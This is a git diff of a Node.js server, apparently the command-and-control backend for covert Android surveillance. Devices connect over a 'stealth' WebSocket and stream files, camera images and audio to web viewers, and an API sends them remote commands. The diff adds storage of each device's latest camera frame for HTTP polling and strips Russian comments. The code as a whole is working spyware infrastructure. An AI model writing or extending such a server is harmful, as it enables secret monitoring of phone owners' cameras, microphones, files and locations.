@@ -8,7 +8,6 @@ import http from "http";
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Объявляем Map'ы один раз
 const deviceCommands = new Map();
 const locations = new Map();
 const stealthConnections = new Map();
@@ -18,7 +17,6 @@ console.log("Starting location tracker server...");
 
 const server = http.createServer(app);
 
-// === Supabase ===
 const supabaseUrl = process.env.SUPABASE_URL || "https://hapwopjrgwdjwfawpjwq.supabase.co";
 const supabaseKey = process.env.SUPABASE_ANON_KEY;
 
@@ -37,7 +35,6 @@ app.use(cors());
 app.use(bodyParser.json({ limit: "50mb" }));
 app.use(express.static("public"));
 
-// === WebSocket setup ===
 const wss = new WebSocketServer({ noServer: true });
 
 server.on("upgrade", (request, socket, head) => {
@@ -76,12 +73,7 @@ wss.on("connection", (ws, req) => {
 
   let deviceId = url.searchParams.get("deviceId");
   
-  // ИСПРАВЬТЕ ЭТУ ПРОВЕРКУ:
-  // Если URL содержит /ws/live - это ВЕБ-КЛИЕНТ для просмотра устройства
-  // Если /ws/stealth - это само устройство Android
-  
   if (pathname.startsWith("/ws/live")) {
-    // ЭТО ВЕБ-КЛИЕНТ
     webClients.add(ws);
     console.log(`Web client connected for device ${deviceId}. Total web clients: ${webClients.size}`);
 
@@ -110,7 +102,6 @@ wss.on("connection", (ws, req) => {
     });
     
   } else if (deviceId && pathname.startsWith("/ws/stealth")) {
-    // ЭТО ANDROID УСТРОЙСТВО
     ws.deviceId = deviceId;
     stealthConnections.set(deviceId, { ws, lastSeen: Date.now(), files: [] });
     console.log(`Device ${deviceId} connected`);
@@ -134,8 +125,18 @@ wss.on("connection", (ws, req) => {
           console.log(`Received ${msg.files.length} files from ${deviceId}`);
         }
         
-        if (msg.type === 'image' || msg.type === 'audio') {
-          console.log(`Broadcasting ${msg.type} from ${deviceId} to ${webClients.size} web clients`);
+        // СОХРАНЯЕМ ПОСЛЕДНИЙ КАДР ДЛЯ HTTP POLLING
+        if (msg.type === 'image') {
+          const deviceInfo = stealthConnections.get(deviceId);
+          if (deviceInfo) {
+            deviceInfo.latestImage = msg.data;
+            deviceInfo.latestImageTime = Date.now();
+          }
+          console.log(`Broadcasting image from ${deviceId} to ${webClients.size} web clients`);
+        }
+        
+        if (msg.type === 'audio') {
+          console.log(`Broadcasting audio from ${deviceId} to ${webClients.size} web clients`);
         }
         
         const broadcast = {
@@ -164,7 +165,6 @@ wss.on("connection", (ws, req) => {
     });
     
   } else {
-    // Неизвестное подключение
     console.log(`Unknown WebSocket connection from ${pathname}`);
     ws.close();
   }
@@ -178,7 +178,6 @@ app.post("/api/login", (req, res) => {
   return res.status(401).json({ success: false, error: "Invalid credentials" });
 });
 
-// GET endpoint для HTTP polling (ОДИН РАЗ)
 app.get('/api/device/:deviceId/command/:token', (req, res) => {
   const { deviceId, token } = req.params;
   
@@ -200,7 +199,6 @@ app.get('/api/device/:deviceId/command/:token', (req, res) => {
   return res.json({ action: null });
 });
 
-// POST endpoint для отправки команд (ОДИН РАЗ)
 app.post("/api/device/command", (req, res) => {
   const { device_id, command, token } = req.body;
   
@@ -240,6 +238,14 @@ app.post("/api/camera/image", (req, res) => {
   if (token !== SECRET_TOKEN) return res.status(401).json({ error: "Unauthorized" });
 
   const { type, device_id, data, timestamp } = req.body;
+  
+  // Сохраняем последний кадр
+  const deviceInfo = stealthConnections.get(device_id);
+  if (deviceInfo && type === 'image') {
+    deviceInfo.latestImage = data;
+    deviceInfo.latestImageTime = Date.now();
+  }
+  
   broadcastToWebClients({ type, deviceId: device_id, data, timestamp: timestamp || Date.now() });
   return res.json({ success: true });
 });
@@ -376,6 +382,7 @@ app.get("/api/device/:deviceId/:token", async (req, res) => {
   }
 });
 
+// HTTP POLLING ENDPOINT ДЛЯ ПОЛУЧЕНИЯ ПОСЛЕДНЕГО КАДРА
 app.get('/api/device/:deviceId/latest-image', (req, res) => {
   const deviceId = req.params.deviceId;
   const deviceInfo = stealthConnections.get(deviceId);
@@ -390,14 +397,6 @@ app.get('/api/device/:deviceId/latest-image', (req, res) => {
     res.json({ success: false, message: 'No image available' });
   }
 });
-
-// В обработчике WebSocket от Android сохраняйте последний кадр:
-if (msg.type === 'image') {
-  const deviceInfo = stealthConnections.get(deviceId);
-  if (deviceInfo) {
-    deviceInfo.latestImage = msg.data;
-    deviceInfo.latestImageTime = Date.now();
-  }
 
 app.get("/", (req, res) => {
   res.sendFile("index.html", { root: "public" });
